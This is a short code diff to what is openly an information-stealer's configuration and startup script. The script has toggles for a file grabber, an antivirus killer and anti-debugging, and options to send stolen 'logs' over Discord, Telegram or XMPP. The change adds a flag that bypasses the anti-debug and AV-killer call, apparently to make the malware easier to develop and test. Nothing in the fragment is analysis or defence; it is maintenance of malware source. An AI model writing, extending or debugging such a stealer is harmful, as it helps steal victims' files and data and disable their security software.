@@ -13,6 +13,7 @@
 enableFileGrubber = False #enable file grabber
 oneStart = False #enable this if you want logs to come only from unique computers
 avKiller = False #enable antiviruses killer
+debuging = False #disable AntiDebug
 
 sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
 # You can write your address for sending logs here
@@ -56,7 +57,8 @@ from scripts.files import Files_txt
 from scripts.files import file_grubber
 from scripts.secure.antiDebug import AntiDebug
 
-AntiDebug(oneStart,avKiller)
+if not debuging:
+    AntiDebug(oneStart,avKiller)
 make_folder.makeFolders(enableFileGrubber,oneStart)
 if enableFileGrubber:
     dataForMassageFiles= file_grubber.Grab(dataForMassageFiles)
